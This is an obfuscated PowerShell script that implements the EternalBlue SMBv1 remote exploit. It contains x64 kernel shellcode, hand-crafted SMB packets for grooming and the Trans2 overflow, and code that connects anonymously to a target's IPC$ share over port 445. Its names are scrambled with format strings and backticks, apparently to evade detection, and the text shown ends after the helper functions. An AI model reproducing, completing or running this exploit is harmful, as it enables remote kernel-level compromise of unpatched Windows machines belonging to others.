sV  ('Dl'+'5') ( [tYPe]("{2}{1}{5}{0}{4}{6}{3}"-f 'XT.','YSte','S','G','E','m.Te','ncODiN'));  sET-itEm  ('VarIaBL'+'E:5'+'7eN') ( [type]("{1}{2}{0}{3}" -F'eRte','BiTco','NV','r'))  ; ${7`D`W8J} =[tyPe]("{0}{1}"-F 'arr','aY') ;    ${q`U0}  =[TypE]("{0}{1}{4}{3}{2}" -f'SySTEM.bItCONv','eR','r','E','t') ;

function I`N`VOk`e`-ETe`RnaLBLuE(${TA`Rget}, ${iNiti`ALgr`o`o`ms}, ${mAx`A`TteM`PtS}, ${sHeL`L`c`ODE}){




${e`Nc} =   ${d`l5}::"ASC`II"


${G`ROoM_d`E`LtA} = 5


function mA`ke_kE`Rn`e`L_SHElLc`odE {
    [Byte[]] ${sheL`lCo`dE} =@(0xB9,0x82,0x00,0x00,0xC0,0x0F,0x32,0x48,0xBB,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,
0xFF,0x89,0x53,0x04,0x89,0x03,0x48,0x8D,0x05,0x0A,0x00,0x00,0x00,0x48,0x89,0xC2,
0x48,0xC1,0xEA,0x20,0x0F,0x30,0xC3,0x0F,0x01,0xF8,0x65,0x48,0x89,0x24,0x25,0x10,
0x00,0x00,0x00,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x50,0x53,0x51,0x52,
0x56,0x57,0x55,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x41,
0x56,0x41,0x57,0x6A,0x2B,0x65,0xFF,0x34,0x25,0x10,0x00,0x00,0x00,0x41,0x53,0x6A,
0x33,0x51,0x4C,0x89,0xD1,0x48,0x83,0xEC,0x08,0x55,0x48,0x81,0xEC,0x58,0x01,0x00,
0x00,0x48,0x8D,0xAC,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x9D,0xC0,0x00,0x00,0x00,
0x48,0x89,0xBD,0xC8,0x00,0x00,0x00,0x48,0x89,0xB5,0xD0,0x00,0x00,0x00,0x48,0xA1,
0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,0xFF,0x48,0x89,0xC2,0x48,0xC1,0xEA,0x20,0x48,
0x31,0xDB,0xFF,0xCB,0x48,0x21,0xD8,0xB9,0x82,0x00,0x00,0xC0,0x0F,0x30,0xFB,0xE8,
0x38,0x00,0x00,0x00,0xFA,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x48,0x83,
0xEC,0x78,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x41,0x5B,0x41,0x5A,0x41,0x59,
0x41,0x58,0x5D,0x5F,0x5E,0x5A,0x59,0x5B,0x58,0x65,0x48,0x8B,0x24,0x25,0x10,0x00,
0x00,0x00,0x0F,0x01,0xF8,0xFF,0x24,0x25,0xF8,0x0F,0xD0,0xFF,0x56,0x41,0x57,0x41,
0x56,0x41,0x55,0x41,0x54,0x53,0x55,0x48,0x89,0xE5,0x66,0x83,0xE4,0xF0,0x48,0x83,
0xEC,0x20,0x4C,0x8D,0x35,0xE3,0xFF,0xFF,0xFF,0x65,0x4C,0x8B,0x3C,0x25,0x38,0x00,
0x00,0x00,0x4D,0x8B,0x7F,0x04,0x49,0xC1,0xEF,0x0C,0x49,0xC1,0xE7,0x0C,0x49,0x81,
0xEF,0x00,0x10,0x00,0x00,0x49,0x8B,0x37,0x66,0x81,0xFE,0x4D,0x5A,0x75,0xEF,0x41,
0xBB,0x5C,0x72,0x11,0x62,0xE8,0x18,0x02,0x00,0x00,0x48,0x89,0xC6,0x48,0x81,0xC6,
0x08,0x03,0x00,0x00,0x41,0xBB,0x7A,0xBA,0xA3,0x30,0xE8,0x03,0x02,0x00,0x00,0x48,
0x89,0xF1,0x48,0x39,0xF0,0x77,0x11,0x48,0x8D,0x90,0x00,0x05,0x00,0x00,0x48,0x39,
0xF2,0x72,0x05,0x48,0x29,0xC6,0xEB,0x08,0x48,0x8B,0x36,0x48,0x39,0xCE,0x75,0xE2,
0x49,0x89,0xF4,0x31,0xDB,0x89,0xD9,0x83,0xC1,0x04,0x81,0xF9,0x00,0x00,0x01,0x00,
0x0F,0x8D,0x66,0x01,0x00,0x00,0x4C,0x89,0xF2,0x89,0xCB,0x41,0xBB,0x66,0x55,0xA2,
0x4B,0xE8,0xBC,0x01,0x00,0x00,0x85,0xC0,0x75,0xDB,0x49,0x8B,0x0E,0x41,0xBB,0xA3,
0x6F,0x72,0x2D,0xE8,0xAA,0x01,0x00,0x00,0x48,0x89,0xC6,0xE8,0x50,0x01,0x00,0x00,
0x41,0x81,0xF9,0xBF,0x77,0x1F,0xDD,0x75,0xBC,0x49,0x8B,0x1E,0x4D,0x8D,0x6E,0x10,
0x4C,0x89,0xEA,0x48,0x89,0xD9,0x41,0xBB,0xE5,0x24,0x11,0xDC,0xE8,0x81,0x01,0x00,
0x00,0x6A,0x40,0x68,0x00,0x10,0x00,0x00,0x4D,0x8D,0x4E,0x08,0x49,0xC7,0x01,0x00,
0x10,0x00,0x00,0x4D,0x31,0xC0,0x4C,0x89,0xF2,0x31,0xC9,0x48,0x89,0x0A,0x48,0xF7,
0xD1,0x41,0xBB,0x4B,0xCA,0x0A,0xEE,0x48,0x83,0xEC,0x20,0xE8,0x52,0x01,0x00,0x00,
0x85,0xC0,0x0F,0x85,0xC8,0x00,0x00,0x00,0x49,0x8B,0x3E,0x48,0x8D,0x35,0xE9,0x00,
0x00,0x00,0x31,0xC9,0x66,0x03,0x0D,0xD7,0x01,0x00,0x00,0x66,0x81,0xC1,0xF9,0x00,
0xF3,0xA4,0x48,0x89,0xDE,0x48,0x81,0xC6,0x08,0x03,0x00,0x00,0x48,0x89,0xF1,0x48,
0x8B,0x11,0x4C,0x29,0xE2,0x51,0x52,0x48,0x89,0xD1,0x48,0x83,0xEC,0x20,0x41,0xBB,
0x26,0x40,0x36,0x9D,0xE8,0x09,0x01,0x00,0x00,0x48,0x83,0xC4,0x20,0x5A,0x59,0x48,
0x85,0xC0,0x74,0x18,0x48,0x8B,0x80,0xC8,0x02,0x00,0x00,0x48,0x85,0xC0,0x74,0x0C,
0x48,0x83,0xC2,0x4C,0x8B,0x02,0x0F,0xBA,0xE0,0x05,0x72,0x05,0x48,0x8B,0x09,0xEB,
0xBE,0x48,0x83,0xEA,0x4C,0x49,0x89,0xD4,0x31,0xD2,0x80,0xC2,0x90,0x31,0xC9,0x41,
0xBB,0x26,0xAC,0x50,0x91,0xE8,0xC8,0x00,0x00,0x00,0x48,0x89,0xC1,0x4C,0x8D,0x89,
0x80,0x00,0x00,0x00,0x41,0xC6,0x01,0xC3,0x4C,0x89,0xE2,0x49,0x89,0xC4,0x4D,0x31,
0xC0,0x41,0x50,0x6A,0x01,0x49,0x8B,0x06,0x50,0x41,0x50,0x48,0x83,0xEC,0x20,0x41,
0xBB,0xAC,0xCE,0x55,0x4B,0xE8,0x98,0x00,0x00,0x00,0x31,0xD2,0x52,0x52,0x41,0x58,
0x41,0x59,0x4C,0x89,0xE1,0x41,0xBB,0x18,0x38,0x09,0x9E,0xE8,0x82,0x00,0x00,0x00,
0x4C,0x89,0xE9,0x41,0xBB,0x22,0xB7,0xB3,0x7D,0xE8,0x74,0x00,0x00,0x00,0x48,0x89,
0xD9,0x41,0xBB,0x0D,0xE2,0x4D,0x85,0xE8,0x66,0x00,0x00,0x00,0x48,0x89,0xEC,0x5D,
0x5B,0x41,0x5C,0x41,0x5D,0x41,0x5E,0x41,0x5F,0x5E,0xC3,0xE9,0xB5,0x00,0x00,0x00,
0x4D,0x31,0xC9,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x3C,0x61,0x7C,0x02,0x2C,0x20,
0x41,0x01,0xC1,0x38,0xE0,0x75,0xEC,0xC3,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,
0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x12,0x48,0x8B,0x72,0x50,0x48,0x0F,
0xB7,0x4A,0x4A,0x45,0x31,0xC9,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,
0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xEE,0x45,0x39,0xD9,0x75,0xDA,0x4C,0x8B,0x7A,
0x20,0xC3,0x4C,0x89,0xF8,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x89,0xC2,0x8B,
0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x01,0xD0,0x50,0x8B,
0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,
0x48,0x01,0xD6,0xE8,0x78,0xFF,0xFF,0xFF,0x45,0x39,0xD9,0x75,0xEC,0x58,0x44,0x8B,
0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,
0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,
0x5B,0x41,0x53,0xFF,0xE0,0x56,0x41,0x57,0x55,0x48,0x89,0xE5,0x48,0x83,0xEC,0x20,
0x41,0xBB,0xDA,0x16,0xAF,0x92,0xE8,0x4D,0xFF,0xFF,0xFF,0x31,0xC9,0x51,0x51,0x51,
0x51,0x41,0x59,0x4C,0x8D,0x05,0x1A,0x00,0x00,0x00,0x5A,0x48,0x83,0xEC,0x20,0x41,
0xBB,0x46,0x45,0x1B,0x22,0xE8,0x68,0xFF,0xFF,0xFF,0x48,0x89,0xEC,0x5D,0x41,0x5F,
0x5E,0xC3)
return ${S`He`LLCODE}
}

function make_`kERneL_U`s`E`R_paY`L`oAD(${ri`Ng3}) {
    ${S`c} = &("{4}{5}{3}{6}{2}{0}{1}" -f 'hellcod','e','_s','e_kerne','m','ak','l')
    ${s`C} +=   (VAriabLe 57En -vALueoN  )::"ge`Tb`ytES"([uint16] (${r`IN`g3}."L`engTh"))
    ${sC} += ${R`ING3}
    return ${Sc}
 }
function MAKE_SMB2`_P`AY`L`OaD`_H`EAdERS`_PaCKeT(){
    [Byte[]] ${p`KT} = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) +   ( VArIABlE  ("DL"+"5") -Va  )::"AS`CIi".("{2}{0}{1}"-f 't','es','GetBy').Invoke("SMB") + [Byte[]](0x00)*124

    return ${P`KT}
}

function MAK`e_`s`mB2`_PaYL`OAd_`BoDy_`Pa`CKeT(${k`eRNEL_Us`E`R_PAy`LoaD}) {
    ${p`KT_maX_`L`en} = 4204
    ${PK`T_SeT`UP_L`EN} = 497
    ${P`kt`_`maX_pa`YloAD} = ${PKt`_Ma`X`_leN} - ${pkt`_SeT`U`P_l`En}

    
    [Byte[]] ${p`kt} = [Byte[]] (0x00) * 0x8
    ${p`kt} += 0x03,0x00,0x00,0x00
    ${p`kt} += [Byte[]] (0x00) * 0x1c
    ${p`kT} += 0x03,0x00,0x00,0x00
     ${p`Kt} += [Byte[]] (0x00) * 0x74


    ${p`kT} += [Byte[]] (0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff) * 2 
    ${P`KT} += [Byte[]] (0x00) * 0x10
    ${p`Kt} += [Byte[]] (0xc0,0xf0,0xdf,0xff) * 2                 
    ${p`kt} += [Byte[]] (0x00) * 0xc4

    
    ${p`KT} += 0x90,0xf1,0xdf,0xff
    ${P`Kt} += [Byte[]] (0x00) * 0x4
    ${P`Kt} += 0xf0,0xf1,0xdf,0xff
    ${P`KT} += [Byte[]] (0x00) * 0x40

    ${P`kT} += 0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
    ${P`KT} += [Byte[]] (0x00) * 0x8
    ${P`KT} += 0x00,0x02,0xd0,0xff,0xff,0xff,0xff,0xff
    ${P`KT} += 0x00

    ${P`KT} += ${kernEL`_`US`er_`payLOaD}

    
    ${p`KT} += 0x00 * (${PkT`_`m`Ax_pa`YLoad} - ${K`Er`Ne`L_usEr_`pAyLoaD}."LE`NG`Th")

    return  ${p`Kt}
}

function mAKE_SMB1`_E`ch`O_p`Ac`K`Et(${tR`Ee`_iD}, ${User_`ID}) {
    [Byte[]]  ${P`Kt} = [Byte[]] (0x00)               
    ${P`kT} += 0x00,0x00,0x31       
    ${p`kt} += [Byte[]] (0xff) + ${E`NC}.("{2}{1}{0}" -f'ytes','etB','G').Invoke("SMB")            
    ${P`KT} += 0x2b               
    ${p`KT} += 0x00,0x00,0x00,0x00   
    ${p`kt} += 0x18               
    ${p`Kt} += 0x07,0xc0           
    ${p`KT} += 0x00,0x00           
    ${p`Kt} += 0x00,0x00,0x00,0x00   
    ${p`kT} += 0x00,0x00,0x00,0x00   
    ${p`Kt} += 0x00,0x00           
    ${p`kt} += ${t`Ree_`ID} 
    ${p`kt} += 0xff,0xfe           
    ${p`kt} += ${UsEr`_`Id} 
    ${p`kt} += 0x40,0x00           

    ${p`kT} += 0x01               
    ${p`kT} += 0x01,0x00           
    ${P`Kt} += 0x0c,0x00           

    
    
    
    ${P`KT} +=  0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x00
    return ${p`KT}
}

function make_s`MB1_TRaNS2`_Ex`pLoi`T_P`Acket(${trE`E_id}, ${US`er_ID}, ${tY`pE}, ${T`i`MEout}) {
    ${TiM`e`oUt} = (${tIm`E`Out} * 0x10) + 3

    [Byte[]]  ${P`kt} = [Byte[]] (0x00)                   
    ${p`kT} += 0x00,0x10,0x35           
    ${P`kT} += 0xff,0x53,0x4D,0x42                
    ${p`Kt} += 0x33                   
    ${P`kT} += 0x00,0x00,0x00,0x00       
    ${P`kT} += 0x18                   
    ${P`kt} += 0x07,0xc0               
    ${p`kt} += 0x00,0x00               
    ${p`KT} += 0x00,0x00,0x00,0x00       
    ${P`kT} += 0x00,0x00,0x00,0x00       
    ${P`kT} += 0x00,0x00               
    ${p`kt} += ${USE`R`_ID}       
    ${p`kt} += 0xff,0xfe               
    ${P`KT} += ${uSE`R_`id}     
    ${p`kT} += 0x40,0x00               

    ${p`KT} += 0x09                   
    ${P`Kt} += 0x00,0x00               
    ${p`Kt} += 0x00,0x10               
    ${P`kt} += 0x00,0x00               
    ${p`KT} += 0x00,0x00               
    ${P`KT} += 0x00                   
    ${P`KT} += 0x00                   
    ${P`KT} += 0x00,0x10               
    ${p`KT} += 0x35,0x00,0xd0           
    ${p`KT} +=   ( lS  VARIaBle:57en )."VAL`Ue"::("{0}{1}"-f'GetBy','tes').Invoke(${T`I`MeoUt})[0] 
    ${p`Kt} += 0x00,0x00               
    ${p`KT} += 0x00,0x10               

    
    
    
    
    

    if (${t`yPe} -eq ("{0}{3}{2}{1}"-f'eb_t','ploit','s2_ex','ran')) {

      ${P`kT} += [Byte[]] (0x41) * 2957

      ${P`Kt} += 0x80,0x00,0xa8,0x00                     

      ${P`Kt} += [Byte[]] (0x00) * 0x10
      ${p`Kt} += 0xff,0xff
      ${p`kT} += [Byte[]] (0x00) * 0x6
      ${p`Kt} += 0xff,0xff
      ${P`KT} += [Byte[]] (0x00) * 0x16

      ${P`kT} += 0x00,0xf1,0xdf,0xff             
      ${P`Kt} += [Byte[]] (0x00) * 0x8
      ${p`kt} += 0x20,0xf0,0xdf,0xff

      ${P`KT} += 0x00,0xf1,0xdf,0xff,0xff,0xff,0xff,0xff 

      ${P`kT} += 0x60,0x00,0x04,0x10
      ${P`Kt} += [Byte[]] (0x00) * 4

      ${P`KT} += 0x80,0xef,0xdf,0xff

      ${p`kT} += [Byte[]] (0x00) * 4
      ${p`Kt} += 0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff
      ${P`kT} += 0x18,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
      ${P`kT} += [Byte[]] (0x00) * 0x10

      ${P`kt} += 0x60,0x00,0x04,0x10
      ${p`kt} += [Byte[]] (0x00) * 0xc
      ${p`kT} += 0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff
      ${P`KT} += [Byte[]] (0x00) * 0x8
      ${P`kT} += 0x80,0x10
      ${p`KT} += [Byte[]] (0x00) * 0xe
      ${P`kt} += 0x39
      ${P`KT} += 0xbb

      ${P`kT} += [Byte[]] (0x41) * 965

      return ${p`kt}
    }

    if(${tY`Pe} -eq ("{4}{2}{3}{0}{1}" -f'_','zero','_tr','ans2','eb')) {
      ${P`KT} += [Byte[]] (0x00) * 2055
      ${p`kT} += 0x83,0xf3
      ${P`Kt} += [Byte[]] (0x41) * 2039
      
     }
    else {
      ${P`Kt} += [Byte[]] (0x41) * 4096
    }

    return ${p`kt}
  }
function NEgOTiaT`E_`PrOT`O_R`EqUESt()
{

      [Byte[]]  ${P`kT} = [Byte[]] (0x00)             
      ${P`Kt} += 0x00,0x00,0x54       

      ${p`KT} += 0xFF,0x53,0x4D,0x42 
      ${p`kt} += 0x72             
      ${P`kT} += 0x00,0x00,0x00,0x00 
      ${P`kT} += 0x18             
      ${p`KT} +=  0x01,0x28         
      ${p`KT} += 0x00,0x00         
      ${P`Kt} += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 
      ${P`Kt} += 0x00,0x00         
      ${p`KT} += 0x00,0x00         
      ${p`KT} += 0x2F,0x4B         
      ${P`KT} += 0x00,0x00         
      ${P`kT} += 0xC5,0x5E           

      ${P`kt} += 0x00             
      ${P`Kt} += 0x31,0x00         

      
      ${p`Kt} += 0x02             
      ${P`kT} += 0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x31,0x2E,0x30,0x00  

      ${p`Kt} += 0x02             
      ${P`kt} += 0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,0x00  

      ${P`kT} += 0x02             
      ${P`kT} += 0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,0x30,0x00 

      ${p`kT} += 0x02             
      ${p`KT} += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00   

      return ${P`Kt}
}


function MAk`e`_sm`B1_`NT`_TRaNs`_pa`ckeT(${tR`Ee`_ID}, ${U`SER_`ID}) {

    [Byte[]]  ${p`kt} = [Byte[]] (0x00)                   
    ${p`Kt} += 0x00,0x04,0x38           
    ${P`KT} += 0xff,0x53,0x4D,0x42       
    ${P`kT} += 0xa0                   
    ${p`KT} += 0x00,0x00,0x00,0x00       
    ${p`kT} += 0x18                   
    ${p`kT} += 0x07,0xc0               
    ${P`KT} += 0x00,0x00               
    ${P`kT} += 0x00,0x00,0x00,0x00       
    ${p`Kt} += 0x00,0x00,0x00,0x00       
    ${p`kt} += 0x00,0x00               
    ${p`kt} += ${tRe`e`_ID}       
    ${p`KT} += 0xff,0xfe               
    ${p`kT} += ${uS`E`R_ID}       
    ${p`kt} += 0x40,0x00               

    ${p`KT} += 0x14                   
    ${P`kT} += 0x01                   
    ${P`KT} += 0x00,0x00               
    ${p`kT} += 0x1e,0x00,0x00,0x00       
    ${p`KT} += 0xd0,0x03,0x01,0x00       
    ${p`KT} += 0x1e,0x00,0x00,0x00       
    ${p`Kt} += 0x00,0x00,0x00,0x00       
    ${p`kT} += 0x1e,0x00,0x00,0x00       
    ${P`Kt} += 0x4b,0x00,0x00,0x00       
    ${P`KT} += 0xd0,0x03,0x00,0x00       
    ${P`kt} += 0x68,0x00,0x00,0x00       
    ${P`Kt} += 0x01                   
    ${P`Kt} += 0x00,0x00               
    ${P`Kt} += 0x00,0x00               
    ${P`kt} += 0xec,0x03               
    ${P`KT} += [Byte[]] (0x00) * 0x1f            

    
    ${p`KT} += 0x01
    ${P`kT} += [Byte[]](0x00) * 0x3cd
    return ${P`kT}
  }

  function  MaKE`_sm`B1`_fREE_holE_SEssion`_`P`ACket(${Fl`AG`s2}, ${V`cn`UM}, ${N`At`IVE_`OS}) {

    [Byte[]] ${P`KT} = 0x00                   
    ${P`KT} += 0x00,0x00,0x51           
    ${p`KT} += 0xff,0x53,0x4D,0x42       
    ${p`Kt} += 0x73                   
    ${P`kT} += 0x00,0x00,0x00,0x00       
    ${p`kt} += 0x18                   
    ${p`KT} += ${f`l`AGS2}                   
    ${P`KT} += 0x00,0x00               
    ${p`kT} += 0x00,0x00,0x00,0x00       
    ${p`kT} += 0x00,0x00,0x00,0x00       
    ${p`kT} += 0x00,0x00               
    ${P`Kt} += 0x00,0x00               
    ${P`Kt} += 0xff,0xfe               
    ${P`KT} += 0x00,0x00               
    ${p`kT} += 0x40,0x00               
    

    ${p`kT} += 0x0c                   
    ${p`KT} += 0xff                   
    ${p`kt} += 0x00                   
    ${p`KT} += 0x00,0x00               
    ${p`kT} += 0x04,0x11               
    ${P`KT} += 0x0a,0x00               
    ${p`kT} += ${VCn`UM}                    
    ${P`kT} += 0x00,0x00,0x00,0x00       
    ${P`Kt} += 0x00,0x00               
    ${p`kt} += 0x00,0x00,0x00,0x00       
    ${P`kT} += 0x00,0x00,0x00,0x80       
    ${p`kT} += 0x16,0x00               
    
    
    
    
    ${P`kt} += ${naT`Iv`E`_oS}
    ${P`KT} += [Byte[]] (0x00) * 17              

    return ${P`kt}
  }

  function  MaKE_S`Mb1_a`Non`YmOUs_LogIN`_pAC`k`eT {
    

    [Byte[]] ${p`Kt} = [Byte[]] (0x00)                    
    ${P`KT} += 0x00,0x00,0x88           
    ${P`kT} += 0xff,0x53,0x4D,0x42             
    ${P`KT} += 0x73                   
    ${P`kt} += 0x00,0x00,0x00,0x00       
    ${P`kT} += 0x18                   
    ${p`KT} += 0x07,0xc0               
    ${P`kt} += 0x00,0x00               
    ${p`kt} += 0x00,0x00,0x00,0x00       
    ${P`kt} += 0x00,0x00,0x00,0x00       
    ${P`KT} += 0x00,0x00               
    ${P`kT} += 0xff,0xfe               
    ${P`Kt} += 0x00,0x00               
    ${p`Kt} += 0x00,0x00               
    ${P`Kt} += 0x40,0x00               

    ${p`kT} += 0x0d                   
    ${p`KT} += 0xff                   
    ${P`kT} += 0x00                   
    ${P`Kt} += 0x88,0x00               
    ${p`kt} += 0x04,0x11               
    ${p`kt} += 0x0a,0x00               
    ${p`KT} += 0x00,0x00               
    ${P`kT} += 0x00,0x00,0x00,0x00       
    ${p`Kt} += 0x01,0x00               
    ${P`Kt} += 0x00,0x00               
    ${P`KT} += 0x00,0x00,0x00,0x00       
    ${P`kt} += 0xd4,0x00,0x00,0x00       
    ${P`kt} += 0x4b,0x00               
    ${P`kt} += 0x00                   
    ${p`KT} += 0x00,0x00               
    ${P`KT} += 0x00,0x00               

    
    ${p`Kt} += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32
    ${p`KT} += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x32,0x00,0x31,0x00,0x39,0x00,0x35,0x00
    ${P`kT} += 0x00,0x00

    
    ${p`Kt} += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32
    ${p`Kt} += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x35,0x00,0x2e,0x00,0x30,0x00,0x00,0x00

    return ${p`kT}
}


function tr`Ee_`cOn`N`E`cT`_Andx_ReQuesT(${TarG`et}, ${u`SErid}) {

     [Byte[]] ${P`kt} = [Byte[]](0x00)              
     ${P`kT} +=0x00,0x00,0x47       


     ${p`KT} +=0xFF,0x53,0x4D,0x42  
     ${P`Kt} +=0x75              
     ${P`KT} +=0x00,0x00,0x00,0x00  
     ${P`KT} +=0x18              
     ${p`kt} +=0x01,0x20          
     ${p`kT} +=0x00,0x00          
     ${P`Kt} +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  
     ${p`kT} +=0x00,0x00          
     ${p`kt} +=0x00,0x00          
     ${P`KT} +=0x2F,0x4B          
     ${p`kT} += ${US`ERid}              
     ${P`kT} +=0xC5,0x5E           


    ${i`PC} = "\\"+ ${T`AR`Get} + "\IPC$"

     ${p`kt} +=0x04              
     ${p`kt} +=0xFF              
     ${p`KT} +=0x00              
     ${P`KT} +=0x00,0x00          
     ${p`KT} +=0x00,0x00          
     ${P`kT} +=0x01,0x00          
     ${p`KT} +=0x1A,0x00          
     ${P`kt} +=0x00              
     ${p`KT} +=   ${D`l5}::"a`SCII".("{0}{1}{2}" -f'Ge','tByt','es').Invoke(${i`pc}) 
     ${P`kt} += 0x00       

     ${P`Kt} += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00   


    ${L`en} = ${P`kt}."Le`NGTH" - 4
    
    ${HE`XLeN} =  ${57`EN}::("{1}{0}{2}"-f'By','Get','tes').Invoke(${L`En})[-2..-4]
    ${P`Kt}[1] = ${HEx`LEN}[0]
    ${P`Kt}[2] = ${h`Exl`en}[1]
    ${p`kT}[3] = ${HE`X`Len}[2]
    return ${P`KT}

    }



function SM`B`_heAder(${smbh`E`Ad`eR}) {

${p`A`RS`E`D_HeaDer} =@{("{0}{4}{1}{3}{2}"-f'se','ve','mponent','r_co','r')=${S`mBHE`Ader}[0..3];
                  ("{1}{0}{2}{3}" -f'mb_comm','s','an','d')=${S`MbH`EADer}[4];
                  ("{1}{2}{0}" -f 's','error_c','las')=${SMbh`E`A`DER}[5];
                  ("{1}{0}{2}" -f 'erv','res','ed1')=${S`m`BHeaDer}[6];
                  ("{3}{1}{0}{2}"-f 'o','c','de','error_')=${SM`BHEaD`Er}[6..7];
                  ("{1}{0}" -f'lags','f')=${SmbHE`Ad`ER}[8];
                  ("{0}{2}{1}" -f'f','gs2','la')=${S`m`Bhe`ADeR}[9..10];
                  ("{1}{2}{0}"-f 'gh','p','rocess_id_hi')=${smBH`E`A`dER}[11..12];
                  ("{3}{1}{2}{0}" -f 're','ig','natu','s')=${SMBhE`AD`eR}[13..21];
                  ("{0}{3}{1}{2}"-f 'res','d','2','erve')=${smbhE`Ad`er}[22..23];
                  ("{1}{0}"-f 'e_id','tre')=${SMBh`EAD`er}[24..25];
                  ("{2}{1}{0}" -f '_id','ess','proc')=${sM`Bhe`Ader}[26..27];
                  ("{0}{2}{1}"-f'user','d','_i')=${SmB`HE`ADER}[28..29];
                  ("{1}{2}{3}{0}" -f'lex_id','mu','lt','ip')=${s`Mbh`ea`DER}[30..31];
                 }
return ${pArSe`D_h`EADEr}

}




function SMb1_Get_`Re`S`pONsE(${s`ocK}){



    ${tcP`_reSP`O`NSE} =   ${7dW`8J}::("{2}{1}{0}"-f 'ance','reateInst','C').Invoke(("{0}{1}" -f'byt','e'), 1024)
    try{
    ${So`ck}.("{2}{0}{1}"-f'ece','ive','R').Invoke(${tCp_r`e`SPoNse})| &("{1}{2}{0}" -f 'l','o','ut-nul')

     }
     catch {
      &("{2}{0}{1}"-f'Verbo','se','Write-') ("{1}{2}{7}{0}{3}{5}{4}{6}"-f' e','s','ocket ','xploit m','y fa','a','il ','error,')
     }
    ${net`B`Ios} = ${tCP`_`ReSPonSe}[0..4]
    ${Sm`B`_He`ADer} = ${T`cP_rE`Sp`on`sE}[4..36]  
    ${PARS`eD_`he`AdEr} = &("{0}{1}{2}" -f'smb','_','header')(${s`m`B_`HeAdER})

    return ${tCP`_R`esPO`NSE}, ${parS`ED`_hEa`d`eR}

}


function c`LIEnt`_NEG`oTIaTE(${SO`ck}){
${r`AW_Pr`oto} = &("{4}{2}{0}{1}{5}{3}"-f't','o_r','egotiate_pro','est','n','equ')
    ${So`cK}.("{0}{1}"-f 'S','end').Invoke(${RAW_P`R`O`To}) | &("{2}{1}{0}"-f'll','u','out-n')
    return &("{0}{4}{5}{1}{3}{2}" -f 's','1_get_res','nse','po','m','b')(${so`cK})

}

function SMB`1_AnoNYmoUS`_LO`G`in(${S`oCK}){
    ${rA`w`_prO`TO} = &("{7}{5}{0}{8}{6}{3}{2}{4}{1}" -f 'ke_smb1_','ket','in_pa','log','c','a','_','m','anonymous')
    ${so`CK}.("{0}{1}"-f 'S','end').Invoke(${rA`w_P`ROTO}) | &("{1}{0}"-f 'ull','out-n')
   return &("{4}{3}{2}{1}{0}"-f'e','_respons','get','_','smb1')(${s`ock})


}

function Tr`Ee`_`CONNe`CT_a`NdX(${S`oCk}, ${t`Ar`GEt}, ${us`ERiD}){
    ${rAW`_P`ROTO} = &("{1}{2}{4}{0}{3}" -f'andx','tre','e_conne','_request','ct_') ${T`Arg`Et} ${u`SEr`ID}
    ${S`ocK}.("{1}{0}" -f'end','S').Invoke(${Ra`W`_pR`otO}) | &("{2}{0}{1}"-f'-nul','l','out')
   return &("{0}{3}{1}{2}"-f 'smb1_get_','on','se','resp')(${S`ock})


}


function S`M`B`1`_A`NOny`M`Ous_cONNEcT_iPC(${TArg`et})
{
    ${cL`IeNt} = &("{2}{1}{0}"-f'ject','ew-Ob','N') ("{2}{6}{3}{1}{4}{0}{5}" -f'TcpCli','et','S','.N','.Sockets.','ent','ystem')(${T`ArG`eT},445)

    ${So`cK} = ${CliE`Nt}."c`LienT"
    &("{4}{2}{3}{1}{0}" -f 'iate','got','ient_','ne','cl')(${S`ock}) | &("{0}{1}{2}" -f'Ou','t-Nu','ll')

    ${R`AW}, ${SM`BHe`Ad`eR} = &("{4}{3}{1}{0}{2}{5}"-f 'on','an','ymous_log','b1_','sm','in') ${sO`Ck}

    ${R`Aw}, ${s`MbHe`ADeR} = &("{0}{2}{3}{1}"-f 'tree_','andx','c','onnect_') ${sO`Ck} ${TA`RGET} ${s`mbh`eADER}."u`sE`R_id"


    return ${SMbH`eA`DeR}, ${S`ocK}



}


